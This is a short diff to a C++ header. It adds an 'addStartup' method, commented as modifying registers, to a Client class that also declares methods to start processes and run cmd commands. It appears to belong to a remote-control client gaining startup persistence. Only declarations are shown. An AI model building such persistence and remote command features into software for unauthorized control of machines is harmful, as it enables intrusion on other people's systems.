@@ -6,6 +6,9 @@ class Client : public Stoppable
 {
 public:
 	Client();
+	//Modify registers
+	void addStartup();
+
 	//Process Execution
 	std::string startProcess(const std::string &);
 	std::string runCmdCommand(const std::string &);
